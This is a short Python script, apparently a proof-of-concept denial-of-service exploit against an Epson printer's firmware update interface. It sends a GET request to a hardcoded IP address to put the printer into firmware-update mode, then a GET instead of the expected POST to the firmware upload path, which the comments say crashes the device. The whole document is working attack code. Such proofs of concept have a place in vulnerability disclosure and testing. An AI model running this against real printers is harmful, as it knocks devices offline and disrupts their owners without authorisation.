import requests

def requestFirmwareUpdate():
    url = 'http://141.87.29.101/FIRMWAREUPDATE'
    requests.get(url)

def triggerDos():
    url = 'http://141.87.29.101/DOWN/FIRMWAREUPDATE/ROM1'
    try:
        # epson printer recive firmware file by `post` method, but `get` method trigger dos.
        requests.get(url, timeout=5)
    except:
        pass

def main():
    # request firmware update mode, printer will ready to recieve firmware file
    requestFirmwareUpdate()

    # just requesting `get` to upload url not `post`, dos occurs.
    triggerDos()

if __name__ == '__main__':
    main()